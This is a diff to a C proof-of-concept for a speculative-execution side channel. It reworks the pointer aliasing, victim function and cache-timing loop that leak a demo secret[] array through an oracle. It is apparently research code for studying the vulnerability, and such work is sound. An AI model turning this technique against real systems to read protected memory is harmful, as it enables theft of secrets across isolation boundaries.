@@ -35,7 +35,7 @@ uint8_t oracle[256 * PAGE_SIZE];
 int32_t big_block[PAGE_SIZE];
 volatile int32_t* load_addrs[NUM_PAGES];
 volatile int32_t store_addrs[NUM_BAGS];
-int32_t** store_p;
+int32_t** alias_q;
 
 const uint32_t secret[] = {'S', 'E', 'C', 'R', 'E', 'T'};
 
@@ -46,14 +46,13 @@ uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
  * value stored at *store_addr even when store_addr != load_addr. We abuse this
  * to read and leak values of secret[] through *load_addr, despite *load_addr
  * never actually containing these values. */
-void victim_function(size_t x, int32_t** store_addr, register volatile int32_t* load_addr) {
+void victim_function(size_t x, volatile int32_t* store_addr, register volatile int32_t* load_addr) {
  // printf("store_addr: %p load_addr: %p    x: %p   malicious pass: %p   \n", store_addr, load_addr, x, mal);
 
-  **store_addr = array1[x];
+  *store_addr = array1[x];
   // placing an lfence here after the store prevents the vulnerability
 //          alias_p = (int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias)));
-  // if (load_addr == store_addr) 
-  //   asm volatile("lfence");
+  if (load_addr == store_addr) asm volatile("lfence");
 
  temp &= oracle[(*(load_addr)) * PAGE_SIZE];
  //  temp &= oracle[(*((int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias))))-1) * PAGE_SIZE];
@@ -84,9 +83,8 @@ void readMemoryByte(size_t malicious_x, int results[256], int pagenum, int dropn
     /* Flush oracle[256*(0..255)] from cache */
   
     training_x = tries % array1_size;
-    uint64_t training_store = (uint64_t)load_addrs[pagenum+2];
-    uint64_t malicious_store = (uint64_t)load_addrs[pagenum+1];
-    uint64_t training_alias = (uint64_t)training_store;
+    volatile int32_t* store_p = &store_addrs[dropnum];
+    uint64_t training_alias = (uint64_t)store_p;
     uint64_t malicious_alias = (uint64_t)load_addrs[pagenum+3];
     int32_t* alias_p;
     for (int k = 0; k < 10; k++) {
@@ -99,13 +97,10 @@ void readMemoryByte(size_t malicious_x, int results[256], int pagenum, int dropn
         // set alias_p to truly alias the store_addr if j%25!=0,
         // and NOT alias the store_addr if j%25==0
         alias_p = (int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias)));
-        *store_p = (int32_t*)(training_store ^ (x & (malicious_store ^ training_store)));
         // printf("%p, %p, %p\n", &store_addrs[dropnum], load_addrs[pagenum], alias_p);
         x = training_x ^ (x & (malicious_x ^ training_x));
         // printf("%lx\n", x);
 
-        //flush( (int32_t*)malicious_alias);
-        flush( (int32_t*)store_p);
         flush( (int32_t*)malicious_alias);
 
         /* Delay */
@@ -115,6 +110,7 @@ void readMemoryByte(size_t malicious_x, int results[256], int pagenum, int dropn
         /* Call the victim! */
         victim_function(x, store_p, alias_p);
       }
+      *store_p -= 1;
     }
 
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
@@ -170,7 +166,7 @@ int main(int argc,
   
   int i;
 
-  store_p = malloc(PAGE_SIZE);
+  alias_q = malloc(PAGE_SIZE);
 
 
   int fd = open("mmap", O_CREAT | O_TRUNC | O_RDWR, S_IRUSR | S_IWUSR);
